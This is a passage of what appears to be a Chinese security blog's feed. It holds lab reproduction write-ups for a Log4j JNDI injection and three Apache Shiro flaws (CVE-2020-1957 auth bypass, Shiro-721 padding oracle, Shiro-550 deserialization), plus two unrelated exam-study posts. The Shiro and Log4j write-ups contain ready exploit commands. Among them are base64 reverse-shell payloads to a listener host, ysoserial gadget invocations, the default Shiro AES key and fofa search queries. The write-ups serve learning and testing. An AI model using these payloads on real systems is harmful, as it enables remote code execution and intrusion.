class="string">`$&#123;java:os&#125;`</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h5 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h5><ul><li>用jndi exploit去做远程恶意类加载，反弹shell</li></ul><h5 id="1-攻击服务器起一个带攻击载荷的LDAP服务"><a href="#1-攻击服务器起一个带攻击载荷的LDAP服务" class="headerlink" title="1.攻击服务器起一个带攻击载荷的LDAP服务"></a>1.攻击服务器起一个带攻击载荷的LDAP服务</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c <span class="string">&quot;&#123;echo,bash -i &gt;&amp; /dev/tcp/192.168.29.128/6969 0&gt;&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A 192.168.29.128</span><br></pre></td></tr></table></figure><h5 id="2-发送请求包，触发"><a href="#2-发送请求包，触发" class="headerlink" title="2.发送请求包，触发"></a>2.发送请求包，触发</h5><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205142137085.png" alt="image-20230205142137085"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro 身份验证绕过漏洞 (CVE-2020-1957)</title>
      <link href="/2023/02/05/Web%E5%AE%89%E5%85%A8/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/Shiro%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/"/>
      <url>/2023/02/05/Web%E5%AE%89%E5%85%A8/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/Shiro%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>Apache Shiro 身份验证绕过漏洞 (CVE-2020-1957) </p><ul><li>Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。</li></ul><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>Apache Shiro &lt; 1.5.3</li></ul><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li>在具有 Spring 动态控制器的 1.5.2 之前的 Apache Shiro 版本中，攻击者可以使用构造恶意构造的请求 <code>..;</code>绕过目录身份验证。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205124707128.png" alt="image-20230205124707128"></p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205124721864.png" alt="image-20230205124721864"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro721(反序列化+Padding Oracle Attack)</title>
      <link href="/2023/02/05/Web%E5%AE%89%E5%85%A8/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/Shiro721/"/>
      <url>/2023/02/05/Web%E5%AE%89%E5%85%A8/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/Shiro721/</url>
      
        <content type="html"><![CDATA[<h2 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h2><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>知道已经登陆用户的合法cookie且目标服务器含有可利用的攻击链就可以进行漏洞利用(<strong>说白了就是要有正确的用户和密码</strong>)</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul><li><p>shiro-721用到的加密方式是AES-128-CBC，而且其中的ase加密的key基本猜不到了，是系统随机生成的</p></li><li><p>这种加密方式容易受到Padding Oracle Attack（填充提示攻击），利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击</p></li></ul><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li>在vulfocus平台进行复现</li></ul><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205122649270.png" alt="image-20230205122649270" style="zoom:50%;" /><h3 id="漏洞复现-脚本ysoserial和shiro-exp"><a href="#漏洞复现-脚本ysoserial和shiro-exp" class="headerlink" title="漏洞复现(脚本ysoserial和shiro_exp)"></a>漏洞复现(脚本ysoserial和shiro_exp)</h3><ul><li><p>服务端在接收cookie时：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、检索RememberMe Cookie的值</span><br><span class="line"><span class="number">2</span>、Base64解码</span><br><span class="line"><span class="number">3</span>、AES解密（加密密钥硬编码）</span><br><span class="line"><span class="number">4</span>、进行反序列化操作（未过滤处理）</span><br><span class="line"><span class="number">5</span>、攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令</span><br></pre></td></tr></table></figure></li><li><p>先使用合法账号进行登录勾选remember Me然后使用bp抓包</p></li><li><p>然后获取到cookie</p></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/6198958186ee61ee4637494361045d36.webp?x-oss-process=image/format,png" alt="img"></p><ul><li>此处注意删除JSESSIONID，否则后续无法利用 将其中的remember Me字段复制下来输入到工具中进行利用：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/123&quot;</span> &gt; payload.class</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exp.py http://192.168.171.137:8080/login.jsp LIO2vKStP5R4NN+TLY0Bgfrz+3sacQHB1BfrOheCVAHeFAGtRsX9JW24tCvcedluOxZwFPoOSs7/tA0fK+UJ9ylRjLIT87NIN1smV22TVqdQ4vSJXB42IQCTV1mDA2CwlDpoeem6M4qY2SeB4JwIpV+iUwNJoOj+NfWeX3/lLZHkoCnsR5TCm6GrHyhdaDZYK0BAJNXFQ9658sJGAF1fztcfR0pYD9RtX26iLW73+D0pd3x6DhPQB7euA4uhUZ3Ue8RoOK3jTqxHC3U5n0DIMpc1RWlHVzUyHjejFAPXCReV+7ds/dWr+b5XlgP9/7ajmi2+6dqr2apVaIhEMC5SP4X4Y+QZw3wS6w76pD1vT8JSlG6l+h4+tIRuS4/gbUzX8GhmPCtw2MBMS/xZ2FsjvTPexdPLEf+114qo4152aNNcXul4zN3czLlve+otlqd5E/WyhhbBA2+EFk+Pewnsq2g2sS53s57H9BcWhXHkcwf0cIrkOXAn9a9xfkkm1HH9 payload.class</span><br></pre></td></tr></table></figure><ul><li>和Shiro550一样，最后会生成恶意的rememberMe cookie</li><li>我们使用这个cookie替换原数据包中的cookie。</li><li>发现目标服务器&#x2F;tmp目录下被创建了一个123文件。</li></ul><h3 id="使用图形化工具复现"><a href="#使用图形化工具复现" class="headerlink" title="使用图形化工具复现"></a>使用图形化工具复现</h3><ul><li>操作步骤：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)确定请求方式，输入URL地址</span><br><span class="line"><span class="number">2</span>)直接选择爆破密钥，一旦爆破成功，便会直接返回指定密钥</span><br><span class="line"><span class="number">3</span>)选择爆破利用链及回显，同样，爆破成功便如图</span><br><span class="line"><span class="number">4</span>)命令执行，直接输入需要执行的命令，也可以反弹shell</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205122727958.png" alt="image-20230205122727958" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230205124015249.png" alt="image-20230205124015249" style="zoom:80%;" /><h3 id="Padding-Oracle-Attack的原理，参考下面的文章"><a href="#Padding-Oracle-Attack的原理，参考下面的文章" class="headerlink" title="Padding Oracle Attack的原理，参考下面的文章"></a>Padding Oracle Attack的原理，参考下面的文章</h3><p><a href="https://www.anquanke.com/post/id/192819">https://www.anquanke.com/post/id/192819</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>河南政治79经验贴</title>
      <link href="/2023/02/05/%E8%80%83%E7%A0%94/%E5%89%8D%E8%BE%88%E5%8F%96%E7%BB%8F/%E6%B2%B3%E5%8D%97%E6%94%BF%E6%B2%BB79%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
      <url>/2023/02/05/%E8%80%83%E7%A0%94/%E5%89%8D%E8%BE%88%E5%8F%96%E7%BB%8F/%E6%B2%B3%E5%8D%97%E6%94%BF%E6%B2%BB79%E7%BB%8F%E9%AA%8C%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="河南政治79经验贴"><a href="#河南政治79经验贴" class="headerlink" title="河南政治79经验贴"></a>河南政治79经验贴</h2><h4 id="先说一下我学政治的全过程。"><a href="#先说一下我学政治的全过程。" class="headerlink" title="先说一下我学政治的全过程。"></a>先说一下我学政治的全过程。</h4><p>选择42，主观题37。</p><p>9月1号开始听徐涛的基础课，然后听一节的内容去做对应的肖1000。因为一开始没买书，所以就网上找了个专门的刷题本来做（本来是打算方便后面二刷，然后一遍都没刷完）。每学一个版块，就看红果研思维导图，自己再总结一遍，尝试复述。学的顺序是马原-&gt;史纲-&gt;毛中特-&gt;思修。</p><p>然后到十月下旬的时候，毛中特学到差不多一半，再去看之前做的1000题，发现已经完全不记得了，这个时候我开始意识到了问题。徐涛讲课是真的有意思，但是，如果没有经常复习的话，恐怕也只能记住讲课中有意思的部分了。虽然现在已经考完三个月了，但是他曾经举过的例子我还是张口就来。像什么卖包子，港台老师工资高之类的。之后肖8就上市了，前几套我最少得过18分，最多也才24分，此时我感觉，我要寄了，因为听说如果政治想70+，选择题至少要40。</p><p>在这生死攸关的时刻，我开始跟腿姐的课。有一说一，全程跟着腿姐好好学70分应该是没有问题。听了一部分她的技巧班之后，又听她的冲刺班，她的冲刺讲义真的是涵盖了当年大部分的考点（虽然我也没有背完）。腿姐也有冲刺手册的带背，每天背十几分钟，重温了一遍马原和史纲。</p><p>肖8第一遍最后平均分大概23左右，做到第七套的时候，我发现了一个up主，大牙考研，他讲肖8讲的对我可谓是雪中送炭，是真的详细，会把这个题相关知识点讲的很详细，而且会把一些帽子题编成顺口溜，听懂记住一个，就相当于会了四五道题，帽子题在考试中还是会占到不少的部分。二刷肖8的时候，基本已经38+了。后面用到了一个小程序：苍盾考研，里面会有市面上所有考研政治老师对应的题目，我只做了肖8肖4,和腿4的其中一套。去吃饭的路上就三刷肖8，到12月就可以45+了，也有几套满分。</p><p>肖4上市之后，就要开始背大题了，b站有很多带背，像大牙、卡子、苏一。对比了一下，我选择了苏一的。虽然身边有很多人都选择看卡子，但是我仔细看过之后，发现卡子的内容还是偏向于肖4的答案，虽然会给你画图讲故事方便记忆，但也仅仅是带背而已。苏一的就会先给你个导图，然后对肖4的答案进行适当合理的修改，最后还会给不同的设问角度都可以用这个答案来答。</p><p>当然，肖4的选择也要做，这时候我只能拿35-40，从来没有比40高过，结果考试直接42哈哈哈哈哈哈哈。</p><p>别把肖4当成神了，背完肖4可能你会发现你背的都在材料里。那些考完说肖4yyds我也搞不懂你们到底是怎么背的。背了几万字最后只押到了两三小个问，马原一个没中，完全考自己理解现场编。考研政治想稳的话还得看腿姐。</p><h2 id="再说下我买过的资料。"><a href="#再说下我买过的资料。" class="headerlink" title="再说下我买过的资料。"></a>再说下我买过的资料。</h2><p>第一本就是徐涛的核心考案，这个跟肖的精讲精练选一本即可。基础知识很全面。</p><p>冲刺手册徐涛、腿姐、肖的我都买过，最后还是看腿姐了，下篇有很多东西腿姐总结的比较全面。</p><p>肖4&#x2F;8必买，选择必须每一题都会，而且必须反复做。剩下的老师可以直接在小程序上做，错了的就截屏，没事就翻翻相册，可以发给同学讨论讨论。</p><p>红果研思维导图，前期看的多一点，有利于建立整体的知识框架，后面就没看了。</p><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>如果再来一次，我可能会按下面的计划来做，不一定完全按照我说的来。</p><p>9月开始马原，听徐涛，刷1000（可二刷三刷）。然后听腿姐技巧班，史纲毛中特和思修。然后直接开背腿姐冲刺讲义，做她的那套题。买小程序做题，看看别的老师出题风格。<strong>冲刺讲义背到考前</strong>。肖8上市之后就做，做一套就去听大牙的讲解，一定记笔记，反复做，反复看。肖8大题可以随便看看。跟腿姐冲刺班，时政大部分都会说到。肖4出来之后跟苏一的带背。</p><p>还有，练好字，个人认为字还算工整</p><p><img src="https://s2.loli.net/2022/03/28/2eZfRNwaCg3Osdk.jpg" alt="QQ图片20220328132113"></p><p>暂时也就想起来这些了。</p>]]></content>
      
      
      <categories>
          
          <category> 考研 </category>
          
          <category> 考研经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 考研 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>英二83分 吐血给两秒七整理千字长文</title>
      <link href="/2023/02/05/%E8%80%83%E7%A0%94/%E5%89%8D%E8%BE%88%E5%8F%96%E7%BB%8F/%E8%8B%B1%E4%BA%8C83%E5%88%86%20%E5%90%90%E8%A1%80%E7%BB%99%E4%B8%A4%E7%A7%92%E4%B8%83%E6%95%B4%E7%90%86%E5%8D%83%E5%AD%97%E9%95%BF%E6%96%87(1)/"/>
      <url>/2023/02/05/%E8%80%83%E7%A0%94/%E5%89%8D%E8%BE%88%E5%8F%96%E7%BB%8F/%E8%8B%B1%E4%BA%8C83%E5%88%86%20%E5%90%90%E8%A1%80%E7%BB%99%E4%B8%A4%E7%A7%92%E4%B8%83%E6%95%B4%E7%90%86%E5%8D%83%E5%AD%97%E9%95%BF%E6%96%87(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="英二83分-吐血给两秒七整理千字长文"><a href="#英二83分-吐血给两秒七整理千字长文" class="headerlink" title="英二83分 吐血给两秒七整理千字长文"></a>英二83分 吐血给两秒七整理千字长文</h2><p>完型错俩，阅读错四个，客观题扣9分。</p><p>下面的经验都是按照英二说的，英一较难，更注重词汇量。而且后面的小三项（新题型、作文、翻译）都不太一样，如果考英一，可以b站搜一下别的教程。英二是翻译一篇文章、英一是一篇文章的五句话，但是英二还是比较好懂。英二作文是图表加小作文、英一是图画（抽象）加大作文。新题型不太了解。只知道英二新题型送分题。</p><h2 id="现阶段"><a href="#现阶段" class="headerlink" title="现阶段"></a>现阶段</h2><h4 id="语法和长难句（两周）"><a href="#语法和长难句（两周）" class="headerlink" title="语法和长难句（两周）"></a>语法和长难句（两周）</h4><p>建议田静或者刘晓燕，我只听了刘，田的书买回来已经没时间看了，新的。建议做下刘晓燕书上的题，磨刀不误砍柴工。长难句是决定你能不能80+的基础。千万别跟何凯文，跟了他，你的对手就赢了一半。（虽然我也没听过，但是大家都这样说）</p><h5 id="单词（背到考前）"><a href="#单词（背到考前）" class="headerlink" title="单词（背到考前）"></a>单词（背到考前）</h5><p>恋恋有词，时间长建议配套朱伟单词课，在<a href="https://www.weilin77.com/search_list?key=5500%E5%85%8D%E8%B4%B9%E3%80%82">https://www.weilin77.com/search_list?key=5500免费。</a></p><p>同时在不背单词上加一本这个书，背几千的之后会出现正序的生僻词，直接跳过，换大纲词书。</p><h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>（语法长难句学完之后即可开始）</p><h4 id="阅读基本方法（一周）"><a href="#阅读基本方法（一周）" class="headerlink" title="阅读基本方法（一周）"></a>阅读基本方法（一周）</h4><p>我用的是唐迟的《阅读的逻辑》，分章节看完之后，自己总结一个思维导图。每次刷题前先<strong>认真</strong>看一遍，把方法论刻在DNA里，对常见的错因形成条件反射。</p><h4 id="真题阅读（反复做，做到考前）"><a href="#真题阅读（反复做，做到考前）" class="headerlink" title="真题阅读（反复做，做到考前）"></a>真题阅读（反复做，做到考前）</h4><p>完型、新题型可以先不做。完型英二比较简单，最后只错了两个，新题型送分，不拿满分建议给自己一巴掌。</p><p>考研真相，从05年开始做，前期比较难啃，可以一天一篇，不要直接做卷子上，答案写在iPad可以，方便后期二刷，一两道题写一页，序号后面写错误原因，然后把不会的词或者读不懂的长难句都记在这一页上。定时练，这时可以先给自己半个小时。</p><p>从10年开始才有了英二这一说，前面的可以只当找感觉。这时候可以限制二十分钟以内了，考场上最好不超过15min&#x2F;篇。</p><p>做完一篇，就去听唐迟讲。然后把学到的都记下。五年一总结，把生词句子都<strong>背熟练</strong>再往后做。10-19至少二刷。留三年最后模拟。</p><p>9月前最好完成一轮刷题。</p><h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>作文和翻译，分别是王江涛和唐静的书。现在先不用管。可以等一轮阅读做完的时候开。可以先拿我的看，毕竟只多了一年的题。到时候找个电子版看看新的书再决定买不买。</p><p>作文如果想稳一点的话，就暑假开始背，一周一篇。可以关注王江涛的公众号，跟往年的带背。不想背也行，考前找几个模板背（我是这样，小作文模板看Monkey的三分归元法，大作文忘了谁的了，到时候笔记发你）。我最后只背了一篇，完全背不下去，就找模板突击了。</p><p>翻译先看唐静的书，看完再做题。两三天一篇，背下来<strong>英语和汉语</strong>。汉语一定要背，体会他的增词减词的方法，很妙。</p><p>——————————————————————————-分割线———————————-————————————————</p><p>差不多就想到这些，推荐个app：番茄todo，里面可以设置每天的任务，然后学习时计时保持专注不让你摸手机，可以找几个身边的朋友一块，开一个自习室，看谁卷的多（阴险）。</p><p>书等我回去给你拿或者让我室友拿给你都行。就阅读的逻辑、田静的长难句、翻译、作文这四本好像，题还是重新买，我都写上面了。</p>]]></content>
      
      
      <categories>
          
          <category> 考研 </category>
          
          <category> 考研经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 考研 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro550(反序列化)</title>
      <link href="/2023/02/04/Web%E5%AE%89%E5%85%A8/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/Shiro550/"/>
      <url>/2023/02/04/Web%E5%AE%89%E5%85%A8/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Shiro/Shiro550/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ul><li><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。</p></li><li><p>Shiro记住用户会话功能的逻辑为：</p></li><li><p>获取RememberMe的值 —&gt; Base64解密 —&gt; ASE解密 –&gt; 反序列化</p></li><li><p>在服务端接收cookie值时，按照如下步骤来解析处理：</p><ol><li><p>检索 RememberMe cookie的值  (CookieRememberMeManager.java文件中)</p></li><li><p>Base64解码</p></li><li><p>使用AES解密（默认ASE秘钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;）</p></li><li><p>反序列化（未过滤） 任何过滤</p><p><strong>在反序列过程中未进行任何过滤，存在RCE</strong></p></li></ol><h4 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h4><ul><li>在返回包的Set-Cookie中存在rememberMe &#x3D; deleteMe字段</li></ul><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li>Apache Shiro ≤ 1.2.4</li></ul></li></ul><h2 id="Shiro特征和检测"><a href="#Shiro特征和检测" class="headerlink" title="Shiro特征和检测"></a>Shiro特征和检测</h2><h4 id="RememberMe字段四种情况"><a href="#RememberMe字段四种情况" class="headerlink" title="RememberMe字段四种情况"></a>RememberMe字段四种情况</h4><ul><li>未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段</li></ul><p><img src="https://img-blog.csdnimg.cn/20210328232634202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><ul><li>登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe&#x3D;deleteMe字段</li></ul><p><img src="https://img-blog.csdnimg.cn/20210328232750124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><ul><li>不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段</li></ul><p><img src="https://img-blog.csdnimg.cn/20210328233010970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><ul><li>勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段</li></ul><p><img src="https://img-blog.csdnimg.cn/20210328233246752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="如何判断网站是否使用shiro"><a href="#如何判断网站是否使用shiro" class="headerlink" title="如何判断网站是否使用shiro"></a>如何判断网站是否使用shiro</h4><ol><li><p>找到网站登录的地方，随便输入账号密码抓包（一定要输入点击登录），看返回包是否有remembeMe字段</p></li><li><p>如果以上么有返回remembeMe字段还可以尝试在请求包中的cookie中加入 rememberMe&#x3D;1 ，来查看返回包是否有rememberMe&#x3D;deleteMe字段。如果cookie字段有值则先清空</p><ul><li>若我们直接访问登录的页面不进行登录(下面的第1种情况)，此时返回的数据包是没有remember字段的<img src="https://img-blog.csdnimg.cn/2021032823410320.png" alt="img"></li></ul></li><li><p>这时，我们手动加上一个cookie:rememberMe&#x3D;1，注意cookie要放在Upgrade的上面，则返回了remember字段。说明使用了shiro框架</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230204235957131.png" alt="image-20230204235957131"></p></li></ol><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><ul><li><p><strong>工具检测</strong>( JDK8)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、shiro_tool.jar 纯字符版</span><br><span class="line"><span class="number">2</span>、ShiroExploitV2<span class="number">.51</span></span><br><span class="line"><span class="number">3</span>、shiro_attack-v2<span class="number">.0</span>.jar</span><br></pre></td></tr></table></figure></li><li><p><strong>fofa</strong> 语法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header=<span class="string">&quot;rememberme=deleteMe&quot;</span>、header=<span class="string">&quot;shiroCookie&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>手动</strong>检测</p><ul><li>参照上面bp抓包，判断set-cookie是否存在remeberMe&#x3D;deleteMe</li></ul></li></ul><h2 id="漏洞复现方式一-懒人化工具，建议学习一下方法二"><a href="#漏洞复现方式一-懒人化工具，建议学习一下方法二" class="headerlink" title="漏洞复现方式一(懒人化工具，建议学习一下方法二)"></a>漏洞复现方式一(懒人化工具，建议学习一下方法二)</h2><h4 id="环境搭建-vulhub"><a href="#环境搭建-vulhub" class="headerlink" title="环境搭建(vulhub)"></a>环境搭建(vulhub)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#### vulhub</span><br><span class="line">cd /usr/local/soft/vulhub/shiro/CVE-2016-4437</span><br><span class="line">docker-compose up -d</span><br><span class="line">访问 http://192.168.142.128:8080</span><br><span class="line">admin   vulhub</span><br><span class="line"></span><br><span class="line">勾选remember me，使用任意用户名密码进行登录（Burp抓包）</span><br></pre></td></tr></table></figure><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exploit.py -t 3 -u http://10.37.129.2:8080 -p <span class="string">&quot;ping -c 2 yeygn1.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure><ul><li>dnslog</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230204235838069.png" alt="image-20230204235838069"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -t 3 -u 目标ip -p <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcxxxxxxxuODguMTYyLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure><h4 id="更多利用工具"><a href="#更多利用工具" class="headerlink" title="更多利用工具"></a>更多利用工具</h4><ul><li>相较于上面的脚本工具，图形化工具操作起来更加的简单<ul><li>工具下载地址：<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51</a></li></ul></li></ul><h2 id="漏洞复现方法二-更细致"><a href="#漏洞复现方法二-更细致" class="headerlink" title="漏洞复现方法二(更细致)"></a>漏洞复现方法二(更细致)</h2><h4 id="利用工具和协议"><a href="#利用工具和协议" class="headerlink" title="利用工具和协议"></a>利用工具和协议</h4><ul><li><strong>JRMP协议&#x2F;服务器</strong><ul><li>JRMP全称为Java Remote Method Protocol，也就是Java远程方法协议,就是我们rmi远程方法调用的底层协议</li></ul></li></ul><h5 id="ysoserial工具"><a href="#ysoserial工具" class="headerlink" title="ysoserial工具"></a>ysoserial工具</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/frohoff/ysoserial</span></span><br><span class="line">编译：mvn <span class="keyword">package</span> -D skipTests</span><br><span class="line"></span><br><span class="line">POP Gadgets</span><br><span class="line">Property-Oriented Programming</span><br><span class="line"></span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener <span class="number">7777</span> CommonsCollecitons1 <span class="string">&#x27;calc.exe&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="利用方式及流程"><a href="#利用方式及流程" class="headerlink" title="利用方式及流程"></a>利用方式及流程</h4><img src="https://secure2.wostatic.cn/static/c87zXqc9xGPjmTFwz4QELF/image.png?auth_key=1675524338-nmVsfAJgb7YSHkmYgbt7GE-0-ec031e216f2b75f20dbaa87d867a344d&file_size=1352769" alt="img" style="zoom: 50%;" /><img src="https://secure2.wostatic.cn/static/p8rU8reDs9mahY6eTRGJjq/image.png?auth_key=1675524968-cM4pEe6Y1unXuXUK52Dqom-0-1865a249bc93524935c246791d9ae071&file_size=367865" alt="img" style="zoom: 67%;" /><ol><li>先在自己服务器开启监听，为的是后续弹shell </li><li>构造一个恶意命令，然后通过序列化、AES加密、base64编码（payload2），写入到Cookie，发给漏洞服务器，作用是让漏洞服务器连接到我们启动的JRMP服务器</li><li>漏洞服务器：base64解码、AES解密、反序列化，执行恶意命令，连接到JRMP服务器 </li><li>继续发送恶意payload1，利用CC等通用库的漏洞执行命令，连接我们监听端口</li></ol><h4 id="漏洞验证和利用"><a href="#漏洞验证和利用" class="headerlink" title="漏洞验证和利用"></a>漏洞验证和利用</h4><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><img 